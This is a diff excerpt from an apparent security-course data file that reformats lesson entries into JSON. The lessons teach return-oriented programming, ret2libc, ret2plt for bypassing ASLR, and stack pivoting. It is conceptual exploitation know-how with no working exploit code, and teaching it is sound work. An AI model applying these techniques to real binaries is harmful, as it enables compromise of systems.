-        id: 'ex-42-4',
-        title: 'Exercise 42.4: ret2plt for ASLR Bypass',
-        description: 'Explain how to use Procedure Linkage Table (PLT) to bypass ASLR.',
-        solution: 'PLT functions are at fixed addresses (no PIE). Use PLT stubs to call read/write for leaking libc addresses. Example: call read@plt to leak GOT entry, calculate libc base, then call system.'
+        "id": "ex-42-4",
+        "title": "Exercise 42.4: ret2plt for ASLR Bypass",
+        "description": "Explain how to use Procedure Linkage Table (PLT) to bypass ASLR.",
+        "solution": "PLT functions are at fixed addresses (no PIE). Use PLT stubs to call read/write for leaking libc addresses. Example: call read@plt to leak GOT entry, calculate libc base, then call system."
       }
     ],
-    practiceQuestions: [
+    "practiceQuestions": [
       {
-        question: 'Why is ROP immune to NX/DEP memory protections?',
-        answer: 'Because ROP does not execute any instructions from writable memory pages (stack or heap). It only executes instructions already located in existing, legitimate, executable code segments (such as libc or the binary itself). NX only prevents execution from data pages, not code pages.'
+        "question": "Why is ROP immune to NX/DEP memory protections?",
+        "answer": "Because ROP does not execute any instructions from writable memory pages (stack or heap). It only executes instructions already located in existing, legitimate, executable code segments (such as libc or the binary itself). NX only prevents execution from data pages, not code pages."
       },
       {
-        question: 'What is a ROP gadget and how is it discovered?',
-        answer: 'A ROP gadget is a short instruction sequence (typically 2-5 instructions) ending in ret. Gadgets are discovered using tools like ROPgadget or ropper that scan executable segments for useful instruction patterns ending with ret (0xC3). Common gadgets include pop reg; ret for loading values.'
+        "question": "What is a ROP gadget and how is it discovered?",
+        "answer": "A ROP gadget is a short instruction sequence (typically 2-5 instructions) ending in ret. Gadgets are discovered using tools like ROPgadget or ropper that scan executable segments for useful instruction patterns ending with ret (0xC3). Common gadgets include pop reg; ret for loading values."
       },
       {
-        question: 'How does stack pivoting work in ROP?',
-        answer: 'Stack pivoting redirects RSP to a controlled memory area. Techniques include: leave; ret (mov rsp, rbp), xchg rax, rsp, or add rsp, N. This is needed when the initial overflow buffer is too small for the full ROP chain, allowing the attacker to use a larger controlled buffer elsewhere.'
+        "question": "How does stack pivoting work in ROP?",
+        "answer": "Stack pivoting redirects RSP to a controlled memory area. Techniques include: leave; ret (mov rsp, rbp), xchg rax, rsp, or add rsp, N. This is needed when the initial overflow buffer is too small for the full ROP chain, allowing the attacker to use a larger controlled buffer elsewhere."
       },
       {
-        question: 'What is ret2libc and why is it useful?',
-        answer: 'ret2libc calls libc functions directly without injecting shellcode. It is useful because: (1) bypasses NX by executing from libc (executable segment), (2) provides powerful functions like system(), execve(), (3) more reliable than raw shellcode, and (4) works even with small overflow buffers.'
+        "question": "What is ret2libc and why is it useful?",
+        "answer": "ret2libc calls libc functions directly without injecting shellcode. It is useful because: (1) bypasses NX by executing from libc (executable segment), (2) provides powerful functions like system(), execve(), (3) more reliable than raw shellcode, and (4) works even with small overflow buffers."
       },
       {
-        question: 'How do you handle ASLR when building ROP chains?',
-        answer: 'ASLR randomizes libc/heap addresses. Solutions: (1) Information leak to reveal addresses, (2) Use PLT functions (fixed addresses) to read GOT entries, (3) Brute force if fork-based server reuses addresses, (4) Partial overwrite to adjust addresses within known range.'
+        "question": "How do you handle ASLR when building ROP chains?",
+        "answer": "ASLR randomizes libc/heap addresses. Solutions: (1) Information leak to reveal addresses, (2) Use PLT functions (fixed addresses) to read GOT entries, (3) Brute force if fork-based server reuses addresses, (4) Partial overwrite to adjust addresses within known range."
       },
       {
-        question: 'What are the limitations of ROP?',
-        answer: 'Limitations include: (1) Requires existing useful gadgets, (2) Complex chain construction, (3) Stack-intensive (large chains need large stack), (4) Mitigated by CFI, shadow stacks, (5) Gadget availability varies by binary/compilation, (6) Difficult to debug and maintain.'
+        "question": "What are the limitations of ROP?",
+        "answer": "Limitations include: (1) Requires existing useful gadgets, (2) Complex chain construction, (3) Stack-intensive (large chains need large stack), (4) Mitigated by CFI, shadow stacks, (5) Gadget availability varies by binary/compilation, (6) Difficult to debug and maintain."
       }
     ],
-    summary: [
-      'ROP chains existing code gadgets to bypass NX/DEP protections.',
-      'Gadgets are short instruction sequences ending in ret.',
-      'ret2libc calls system/execve without shellcode injection.',
-      'Stack pivoting redirects RSP to controlled memory areas.',
-      'ROP enables complex operations: memory read/write, conditionals.',
-      'CFI and shadow stacks are effective ROP mitigations.',
-      'ROP is fundamental to modern binary exploitation.',
-      'Understanding ROP is essential for both offense and defense.'
+    "summary": [
+      "ROP chains existing code gadgets to bypass NX/DEP protections.",
+      "Gadgets are short instruction sequences ending in ret.",
+      "ret2libc calls system/execve without shellcode injection.",
+      "Stack pivoting redirects RSP to controlled memory areas.",
+      "ROP enables complex operations: memory read/write, conditionals.",
+      "CFI and shadow stacks are effective ROP mitigations.",
+      "ROP is fundamental to modern binary exploitation.",
+      "Understanding ROP is essential for both offense and defense."
     ]
   },
   {
